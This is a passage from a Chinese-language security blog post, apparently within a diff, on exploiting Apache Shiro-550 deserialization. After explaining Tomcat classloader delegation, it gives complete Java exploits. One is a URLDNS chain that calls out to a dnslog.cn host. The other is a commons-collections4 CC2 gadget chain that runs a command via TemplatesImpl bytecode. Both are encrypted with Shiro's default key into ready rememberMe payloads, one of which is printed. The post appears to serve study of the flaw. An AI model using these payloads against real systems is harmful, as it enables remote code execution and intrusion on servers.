class="hljs-built_in">this</span>.resolveClass(clazz);<br>                        &#125;<br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var12) &#123;<br>                    <span class="hljs-comment">// 忽略类未找到异常，继续尝试其他加载方式</span><br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 如果调试日志启用，记录开始在本地仓库搜索类的信息</span><br>            <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                log.debug(<span class="hljs-string">&quot;  Searching local repositories&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 尝试从本地仓库查找并加载类</span><br>                clazz = <span class="hljs-built_in">this</span>.findClass(name);<br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-comment">// 如果未找到类，跳出标签标记的代码块</span><br>                    <span class="hljs-keyword">break</span> label220;<br>                &#125;<br>                <span class="hljs-comment">// 如果加载成功，记录日志</span><br>                <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                    log.debug(<span class="hljs-string">&quot;  Loading class from local repository&quot;</span>);<br>                &#125;<br>                <span class="hljs-comment">// 如果需要解析类，则解析该类</span><br>                <span class="hljs-keyword">if</span> (resolve) &#123;<br>                    <span class="hljs-built_in">this</span>.resolveClass(clazz);<br>                &#125;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var13) &#123;<br>                <span class="hljs-comment">// 忽略类未找到异常，跳出标签标记的代码块</span><br>                <span class="hljs-keyword">break</span> label220;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 如果没有委托给父类加载器加载类</span><br>        <span class="hljs-keyword">if</span> (!delegateLoad) &#123;<br>            <span class="hljs-comment">// 如果调试日志启用，记录最后委托给父类加载器加载类的信息</span><br>            <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                log.debug(<span class="hljs-string">&quot;  Delegating to parent classloader at end: &quot;</span> + <span class="hljs-built_in">this</span>.parent);<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 尝试使用父类加载器加载类</span><br>                Class&lt;?&gt; var21 = Class.forName(name, <span class="hljs-literal">false</span>, <span class="hljs-built_in">this</span>.parent);<br>                <span class="hljs-keyword">if</span> (var21 == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-comment">// 如果未找到类，抛出类未找到异常</span><br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(name);<br>                &#125;<br>                <span class="hljs-comment">// 如果加载成功，记录日志</span><br>                <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                    log.debug(<span class="hljs-string">&quot;  Loading class from parent&quot;</span>);<br>                &#125;<br>                <span class="hljs-comment">// 如果需要解析类，则解析该类</span><br>                <span class="hljs-keyword">if</span> (resolve) &#123;<br>                    <span class="hljs-built_in">this</span>.resolveClass(var21);<br>                &#125;<br>                <span class="hljs-keyword">return</span> var21;<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var14) &#123;<br>                <span class="hljs-comment">// 抛出类未找到异常</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(name);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果所有尝试都失败，抛出类未找到异常</span><br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(name);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>主要的类加载方法</p>
+<ol>
+<li>clazz &#x3D; this.findLoadedClass0(name);</li>
+<li>clazz &#x3D; this.findLoadedClass(name);</li>
+<li>clazz &#x3D; this.j2seClassLoader.loadClass(name);</li>
+<li>clazz &#x3D; Class.forName(name, false, this.parent); 当 delegateLoad 为 true 或者 false 都会经过这个 forName</li>
+<li>clazz &#x3D; this.findClass(name);</li>
+</ol>
+<p>而数组类型缓存和类加载器无法加载，就会进入  Class.forName 方法传入 this.parent 向上委托</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420133400523.png" srcset="/img/loading.gif" lazyload alt="image-20250420133400523"></p>
+<p>这里的加载流程为</p>
+<p>加载核心类时：java.lang.String</p>
+<ul>
+<li><code>URLClassLoader</code> <strong>首先将请求委托给它的父加载器</strong>。<code>URLClassLoader</code> 的父加载器通常是扩展类加载器 (ExtClassLoader)</li>
+<li>扩展类加载器再将请求委托给它的父加载器，也就是 <strong>引导类加载器 (Bootstrap ClassLoader)</strong>。</li>
+<li><strong>引导类加载器</strong> 在其负责的路径（如 <code>rt.jar</code> 或 JRE 核心模块）中查找 。它 <strong>能够找到并加载</strong> 核心 Java 类。如 int String 等</li>
+<li><strong>获取元素类型</strong>: 由于委托链成功地让引导类加载器加载了 <code>java.lang.String</code>，<code>this.parent</code> (URLClassLoader) 最终能够获取到 <code>java.lang.String</code> 的 <code>Class</code> 对象。</li>
+<li><strong>数组类创建</strong>: 因为元素类型 <code>java.lang.String</code> 的 <code>Class</code> 对象已成功加载（并且其定义类加载器是 Bootstrap ClassLoader），JVM 现在可以动态地创建 <code>String[]</code> 的 <code>Class</code> 对象。<strong>数组类的定义加载器与其元素类型的定义加载器相同</strong>。因此，<code>String[]</code> 的定义加载器也是 Bootstrap ClassLoader。</li>
+<li><strong>返回结果</strong>: <code>Class.forName</code> 成功返回 <code>String[]</code> 的 <code>Class</code> 对象。</li>
+</ul>
+<p>而加载外部类时：Transformer</p>
+<ul>
+<li><code>URLClassLoader</code> 将请求委托给它的父加载器 (ExtClassLoader)。</li>
+<li>Ext Loader 委托给 Bootstrap Loader。</li>
+<li><strong>Bootstrap Loader 找不到 <code>Transformer</code></strong> (它不是核心 JRE 类)。</li>
+<li><strong>Platform&#x2F;Ext Loader 找不到 <code>Transformer</code></strong> (它不在扩展目录或平台模块中)。</li>
+<li>请求回到 <code>this.parent</code> (URLClassLoader)。它会 <strong>搜索自己配置的 URLs</strong> ( Tomcat 的 <code>shared/lib</code> 或 <code>common/lib</code> 目录)。</li>
+<li>而 <code>Transformer</code> 位于 <code>WEB-INF/classes</code> 或 <code>WEB-INF/lib</code> 中，<strong>这些路径通常不包含在父加载器 (<code>this.parent</code>) 的搜索路径中</strong>。因此，<code>this.parent</code> 也找不到 <code>Transformer</code>。</li>
+</ul>
+<p>看到 URLClassLoader 的路径主要就是 tomcat 的 lib 包目录</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420134054839.png" srcset="/img/loading.gif" lazyload alt="image-20250420134054839"></p>
+<h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>这应该是最常用的漏洞验证的链了，jdk 自身的发送 http 请求的链条</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://x8o4kd.dnslog.cn&quot;</span>);<br>        <span class="hljs-comment">// 反射修改hashCode值，避免本地发送请求</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> uri.getClass().getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(uri, <span class="hljs-number">1</span>);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(uri, <span class="hljs-string">&quot;lingx5&quot;</span>);<br>        field.set(uri,-<span class="hljs-number">1</span>); <span class="hljs-comment">// 还原hashCode值</span><br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(hashMap);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] URLbytes = barr.toByteArray();<br>        <span class="hljs-comment">// AES加密</span><br>        <span class="hljs-type">byte</span>[] encryptKey = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(encryptKey, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-comment">// 生成一个固定的 IV（实际应用中建议随机生成并随密文一起传输）</span><br>        <span class="hljs-type">byte</span>[] iv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(iv);<br>        cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);<br>        <span class="hljs-type">byte</span>[] encryptedBytes = cipher.doFinal(URLbytes);<br>        <span class="hljs-comment">// 合并 IV 和密文</span><br>        <span class="hljs-type">byte</span>[] newBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[iv.length + encryptedBytes.length];<br>        System.arraycopy(iv, <span class="hljs-number">0</span>, newBytes, <span class="hljs-number">0</span>, iv.length);<br>        System.arraycopy(encryptedBytes, <span class="hljs-number">0</span>, newBytes, iv.length, encryptedBytes.length);<br>        <span class="hljs-comment">// Base64编码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">encodedString</span> <span class="hljs-operator">=</span> Base64.encodeToString(newBytes);<br>        System.out.println(encodedString);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 模拟Shiro解密过程进行验证</span><br><span class="hljs-comment">         * */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">        // Base64解码</span><br><span class="hljs-comment">        byte[] decode = Base64.decode(encodedString);</span><br><span class="hljs-comment">        // 分割 IV 和密文</span><br><span class="hljs-comment">        byte[] deIv = new byte[16];</span><br><span class="hljs-comment">        byte[] enBytes = new byte[decode.length - deIv.length];</span><br><span class="hljs-comment">        System.arraycopy(decode,0,deIv,0,deIv.length);</span><br><span class="hljs-comment">        System.arraycopy(decode,deIv.length,enBytes,0,enBytes.length);</span><br><span class="hljs-comment">        IvParameterSpec deIvSpace = new IvParameterSpec(deIv);</span><br><span class="hljs-comment">        cipher.init(Cipher.DECRYPT_MODE, key, deIvSpace);</span><br><span class="hljs-comment">        byte[] decryptedBytes = cipher.doFinal(enBytes);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        // 反序列化验证</span><br><span class="hljs-comment">        ByteArrayInputStream bais = new ByteArrayInputStream(decryptedBytes);</span><br><span class="hljs-comment">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="hljs-comment">        ois.readObject();</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">AAAAAAAAAAAAAAAAAAAAAItICRDL55PQ4M+uF<span class="hljs-regexp">/0QjIxmsxx8mwO0zL+cCUsm9HObVST6ifzXbe1pfVhnBOcNB/</span>avKvCNhZKKEkw8li0SSbf62ZGen2JxK9GPNTlXi10BYih5NVjk4ocW4ENUi6hZlSxiNlyC3Q25XwIhMON<span class="hljs-regexp">/uw7crTuwACWmWE0jIdPOYyABOdZJA9nlewAZpTrmEaHbZYQB5KVDpRXP2yqBkbTvjNUfIvwEuX60rpPKt7e8sEjSxFlwSCz3FKopCi3NiM3aeeXV8drr/</span>SI0NQCbrCDgntbel3wZLXU0pMelccjtIQfq7JmBPs81MT3PR1GKNd5UWi8ESuneT6fkFK6FRu6pqfCmF9hYZMfctiA1v8GUGxpI<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250421105715521.png" srcset="/img/loading.gif" lazyload alt="image-20250421105715521"></p>
+<h3 id="CC2payload"><a href="#CC2payload" class="headerlink" title="CC2payload"></a>CC2payload</h3><p>CC2 可以攻击的是 <code>commons-collections4</code> </p>
+<p>需要 shiro 环境有 commons-collections4 依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shiro550CC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-type">byte</span>[] getEvil()&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span>  <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>            evil.setSuperclass(ctClass.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>            evil.makeClassInitializer().insertBefore(cmd);<br>            <span class="hljs-type">byte</span>[] bytes = evil.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> PriorityQueue <span class="hljs-title function_">gadget</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 构造TemplatesImpl对象</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> (TemplatesImpl) clazz.getConstructor().newInstance();<br>        setField(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getEvil()&#125;);<br>        setField(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-comment">// 构造 CC2 利用链</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(invokerTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>,comparator);<br>        setField(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125; );<br>        setField(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">return</span> priorityQueue;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化PriorityQueue对象</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(gadget());<br>        oos.close();<br>        <br>        <span class="hljs-type">byte</span>[] CC2bytes = baos.toByteArray();<br>        <span class="hljs-comment">// AES加密</span><br><br>        <span class="hljs-type">byte</span>[] encryptKey = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(encryptKey, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-comment">// 生成一个固定的 IV（实际应用中建议随机生成并随密文一起传输）</span><br>        <span class="hljs-type">byte</span>[] iv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        javax.crypto.spec.<span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.IvParameterSpec(iv);<br>        cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);<br>        <span class="hljs-type">byte</span>[] encryptedBytes = cipher.doFinal(CC2bytes);<br>        <span class="hljs-comment">// 合并 IV 和密文</span><br>        <span class="hljs-type">byte</span>[] newBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[iv.length + encryptedBytes.length];<br>        System.arraycopy(iv, <span class="hljs-number">0</span>, newBytes, <span class="hljs-number">0</span>, iv.length);<br>        System.arraycopy(encryptedBytes, <span class="hljs-number">0</span>, newBytes, iv.length, encryptedBytes.length);<br>        <span class="hljs-comment">// Base64编码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">encodedString</span> <span class="hljs-operator">=</span> Base64.encodeToString(newBytes);<br>        System.out.println(encodedString);<br>        <br>         <span class="hljs-comment">/**</span><br><span class="hljs-comment">          * 模拟Shiro解密过程进行验证</span><br><span class="hljs-comment">          * */</span><br>        <br>        <span class="hljs-comment">// Base64解码</span><br>        <span class="hljs-type">byte</span>[] decode = Base64.decode(encodedString);<br>        <span class="hljs-comment">// 分割 IV 和密文</span><br>        <span class="hljs-type">byte</span>[] deIv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">byte</span>[] enBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[decode.length - deIv.length];<br>        System.arraycopy(decode,<span class="hljs-number">0</span>,deIv,<span class="hljs-number">0</span>,deIv.length);<br>        System.arraycopy(decode,deIv.length,enBytes,<span class="hljs-number">0</span>,enBytes.length);<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">deIvSpace</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(deIv);<br>        cipher.init(Cipher.DECRYPT_MODE, key, deIvSpace);<br>        <span class="hljs-type">byte</span>[] decryptedBytes = cipher.doFinal(enBytes);<br><br><br>        <span class="hljs-comment">// 反序列化验证</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decryptedBytes);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
